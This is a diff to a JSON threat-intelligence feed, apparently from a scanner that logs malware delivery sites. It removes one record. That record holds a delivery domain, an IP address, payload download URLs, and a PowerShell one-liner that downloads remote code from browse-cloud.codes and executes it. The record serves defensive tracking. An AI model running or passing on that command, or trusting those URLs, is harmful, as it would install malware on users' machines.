@@ -2926,31 +2926,5 @@
     ],
     "ReportId": "cmwgmq2yd0lr20omlqz1zffk5",
     "ScannedAt": "2026-11-14T16:37:51.895000+00:00"
-  },
-  {
-    "UrlDomain": "aar.urgentbusiness.com.ng",
-    "DeliveryUrl": [
-      "browse-cloud.codes"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "65.181.124.231"
-    ],
-    "Related": [
-      {
-        "Value": "https://browse-cloud.codes/a635234e252c668b",
-        "Type": "payload download"
-      },
-      {
-        "Value": "https://browse-cloud.codes/api.php?s=7f6210a091c37ae9bfa1bfd2562d440d842370e171427c6b&amp;_v=29911123",
-        "Type": "Reference"
-      }
-    ],
-    "Payload": "irm 'browse-cloud.codes/a635234e252c668b'|iex;",
-    "ResolvedDownloadUrl": [
-      "https://browse-cloud.codes/a635234e252c668b"
-    ],
-    "ReportId": "cmwginvma0lic0omlk1c2ku1a",
-    "ScannedAt": "2026-11-14T14:44:10.592000+00:00"
   }
 ]
